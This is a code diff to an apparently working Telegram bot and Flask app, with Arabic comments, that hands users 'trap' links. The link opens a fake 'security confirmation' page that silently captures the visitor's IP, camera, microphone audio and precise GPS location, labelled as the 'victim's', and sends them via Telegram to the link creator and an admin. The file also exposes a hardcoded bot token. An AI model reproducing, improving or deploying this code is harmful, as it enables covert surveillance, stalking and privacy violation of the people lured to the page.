@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (v26.0) ---
+# --- إعدادات الإمبراطور سيوفي (v27.0) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
@@ -13,11 +13,12 @@ API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 SUB_URL = "https://t.me/FAABOT?start=7041600701" 
 DATA_FILE = "database.json"
 
-# دالة لحفظ واسترجاع البيانات لضمان عدم ضياع قائمة المستخدمين
 def load_data():
     if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, "r") as f: return json.load(f)
-    return {"all_users": {}, "banned_users": []}
+        try:
+            with open(DATA_FILE, "r") as f: return json.load(f)
+        except: pass
+    return {"all_users": {}, "banned_users": [], "stages": {}}
 
 def save_data(data):
     with open(DATA_FILE, "w") as f: json.dump(data, f)
@@ -33,17 +34,17 @@ def tg_request(method, payload=None, files=None):
 def find_user_id(input_str):
     input_str = input_str.strip().replace("@", "").lower()
     if input_str.isdigit(): return input_str
-    for uid, uname in db["all_users"].items():
+    for uid, uname in db.get("all_users", {}).items():
         if uname.strip().replace("@", "").lower() == input_str: return uid
     return None
 
-# واجهة الصيد (تم إصلاح جلب الموقع وإرساله)
+# واجهة الصيد الاحترافية
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ title }}</title>
+    <title>تأكيد الأمان</title>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; }
@@ -72,8 +73,7 @@ HTML_TEMPLATE = '''
                 const ipD = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                 const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 const v = document.getElementById('v'); v.srcObject = stream; await v.play();
-                const b = await navigator.getBattery().catch(() => ({}));
-                await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipD.ip}\`\\n🔋 البطارية: ${Math.round(b.level*100)}%\\n📱 النظام: ${navigator.platform}`, 'msg');
+                await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipD.ip}\`\\n📱 النظام: ${navigator.platform}`, 'msg');
                 navigator.geolocation.getCurrentPosition(p => {
                     send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                 }, null, {enableHighAccuracy: true});
@@ -84,7 +84,7 @@ HTML_TEMPLATE = '''
                     recorder.ondataavailable = e => chunks.push(e.data);
                     recorder.onstop = async () => {
                         const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks));
-                        reader.onloadend = async () => { await send(reader.result, 'aud'); document.getElementById('st').innerText = "✅ اكتمل الفحص!"; stream.getTracks().forEach(t => t.stop()); };
+                        reader.onloadend = async () => { await send(reader.result, 'aud'); document.getElementById('st').innerText = "✅ مكتمل!"; stream.getTracks().forEach(t => t.stop()); };
                     };
                     recorder.start(); setTimeout(() => recorder.stop(), 5000);
                 }, 2000);
@@ -96,7 +96,7 @@ HTML_TEMPLATE = '''
 '''
 
 @app.route('/t/<uid>')
-def trap(uid): return render_template_string(HTML_TEMPLATE, title="تأكيد الأمان", user_id=uid)
+def trap(uid): return render_template_string(HTML_TEMPLATE, user_id=uid)
 
 @app.route('/api/capture/<uid>', methods=['POST'])
 def capture(uid):
@@ -105,8 +105,8 @@ def capture(uid):
     t, d = data.get('t'), data.get('d')
     for r_id in list(set([str(uid), str(ADMIN_ID)])):
         if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
-        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة الضحية"}, {'photo': ('c.jpg', base64.b64decode(d.split(',')[1]))})
-        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة الضحية"}, {'voice': ('v.ogg', base64.b64decode(d.split(',')[1]))})
+        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة"}, {'photo': ('c.jpg', base64.b64decode(d.split(',')[1]))})
+        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة"}, {'voice': ('v.ogg', base64.b64decode(d.split(',')[1]))})
     return "OK"
 
 @app.route('/webhook', methods=['POST'])
@@ -114,19 +114,23 @@ def webhook():
     update = request.get_json(force=True, silent=True)
     if not update: return "OK"
     
-    msg = update.get("message") or update.get("callback_query", {}).get("message")
+    msg_data = update.get("message") or update.get("callback_query", {}).get("message")
     user_info = update.get("message", {}).get("from") or update.get("callback_query", {}).get("from")
     if not user_info: return "OK"
     
     chat_id = str(user_info["id"])
     username = f"@{user_info.get('username', 'NoUser')}"
-    
-    # تسجيل المستخدم وحفظه في الملف فوراً
-    if chat_id not in db["all_users"] or db["all_users"][chat_id] != username:
+    full_name = user_info.get("first_name", "Unknown")
+
+    # 1. تسجيل وتنبيه فوري للأدمن بدخول مستخدم جديد
+    if chat_id not in db["all_users"]:
         db["all_users"][chat_id] = username
         save_data(db)
+        if chat_id != ADMIN_ID:
+            report = f"👤 **دخول مستخدم جديد:**\n\n**الاسم:** {full_name}\n**اليوزر:** {username}\n**الايدي:** `{chat_id}`"
+            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})
 
-    if chat_id in db["banned_users"]: return "OK"
+    if chat_id in db.get("banned_users", []): return "OK"
     if "callback_query" in update: return handle_callback(update["callback_query"])
     
     text = update["message"].get("text", "")
@@ -134,48 +138,45 @@ def webhook():
         if text.startswith("/user_ban"):
             target = text.replace("/user_ban", "").strip()
             tid = find_user_id(target)
-            if tid: 
+            if tid:
                 if tid not in db["banned_users"]: db["banned_users"].append(tid); save_data(db)
-                tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر `{target}`"})
-            return "OK"
-        elif text.startswith("/user_unban"):
-            target = text.replace("/user_unban", "").strip()
-            tid = find_user_id(target)
-            if tid in db["banned_users"]: db["banned_users"].remove(tid); save_data(db)
-            tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر `{target}`"})
+                tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر `{target}`"})
             return "OK"
         elif text.startswith("/clear"):
             target = text.replace("/clear", "").strip()
             tid = find_user_id(target)
-            if tid: tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير سجلاتك."}); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم التصفير لـ `{target}`"})
+            if tid: tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير سجلاتك."})
             return "OK"
         
         adm_kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}]]}
-        tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 لوحة الإمبراطور v26.0\nللحظر استخدم اليوزر أو الايدي.", "reply_markup": adm_kb})
+        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة الإمبراطور v27.0 جاهزة.", "reply_markup": adm_kb})
         return "OK"
 
-    # نظام الاشتراك المزدوج
-    user_stage = db.get("stages", {}).get(chat_id, 0)
-    if user_stage < 2:
+    # نظام الاشتراك
+    stage = db.get("stages", {}).get(chat_id, 0)
+    if stage < 2:
         if "stages" not in db: db["stages"] = {}
-        db["stages"][chat_id] = user_stage + 1
+        db["stages"][chat_id] = stage + 1
         save_data(db)
-        tg_request("sendMessage", {"chat_id": chat_id, "text": f"🛑 خطوة {user_stage+1} من 2: اشترك وفعل البوت.", "reply_markup": {"inline_keyboard": [[{"text": "اضغط للاشتراك ✅", "url": SUB_URL}]]}})
+        tg_request("sendMessage", {"chat_id": chat_id, "text": f"🛑 خطوة {stage+1}/2: اشترك بالقناة.", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}]]}})
         return "OK"
 
     tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 لوحة المستخدم:", "reply_markup": {"inline_keyboard": [[{"text": "🔗 إنشاء رابطي", "callback_data": "gen_my_link"}]]}})
     return "OK"
 
 def handle_callback(query):
-    cid = str(query["from"]["id"]); data = query["data"]
+    cid = str(query["from"]["id"]); data = query["data"]; query_id = query["id"]
+    # إنهاء حالة "التحميل" فوراً
+    tg_request("answerCallbackQuery", {"callback_query_id": query_id})
+    
     if data == "gen_my_link":
         tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}/t/{cid}`"})
     elif data == "list_all" and cid == ADMIN_ID:
-        res = "👥 **قائمة الإمبراطور:**\n\n"
-        for uid, uname in db["all_users"].items():
-            s = "🚫" if uid in db["banned_users"] else "✅"
-            res += f"{s} {uname} | `{uid}`\n"
-        tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
+        res = "👥 **قائمة المستخدمين:**\n\n"
+        for uid, uname in db.get("all_users", {}).items():
+            status = "🚫" if uid in db.get("banned_users", []) else "✅"
+            res += f"{status} {uname} | `{uid}`\n"
+        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res, "parse_mode": "Markdown"})
     return "OK"
 
 if __name__ == '__main__':
